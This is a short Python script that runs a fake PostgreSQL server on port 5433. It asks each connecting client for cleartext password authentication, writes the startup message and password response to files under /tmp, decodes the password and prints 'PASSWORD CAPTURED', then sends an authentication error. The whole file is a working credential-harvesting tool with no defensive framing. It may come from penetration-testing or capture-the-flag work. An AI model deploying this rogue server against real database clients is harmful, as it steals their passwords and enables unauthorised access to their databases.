import socket, struct, sys

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 5433))
s.listen(1)
print("Fake PG (cleartext auth) listening on 5433")
sys.stdout.flush()

while True:
    c, a = s.accept()
    print(f"Connection from {a}")
    sys.stdout.flush()
    
    # Read startup message
    data = c.recv(4096)
    with open("/tmp/pg_startup.txt", "a") as f:
        f.write(f"Startup from {a}: {data.hex()}\n")
    
    # Send AuthenticationCleartextPassword (type 3)
    # R = 'R', length = 8 (4 + 4), auth_type = 3
    auth_msg = b'R' + struct.pack('!II', 8, 3)
    c.send(auth_msg)
    
    # Read password response
    pwd_data = c.recv(4096)
    with open("/tmp/pg_passwords.txt", "a") as f:
        f.write(f"From {a}: {pwd_data.hex()}\n")
        # Parse password message: 'p' + length(4) + password(null-terminated)
        if pwd_data[0:1] == b'p':
            pwd_len = struct.unpack('!I', pwd_data[1:5])[0]
            password = pwd_data[5:5+pwd_len-5].decode('utf-8', errors='replace').rstrip('\x00')
            f.write(f"PASSWORD: {password}\n")
            print(f"PASSWORD CAPTURED: {password}")
            sys.stdout.flush()
    
    # Send error to close cleanly
    error_msg = b'E' + struct.pack('!I', 50) + b'SFATAL\x00VFATAL\x00C28000\x00Mauth failed\x00\x00'
    try:
        c.send(error_msg)
    except:
        pass
    c.close()
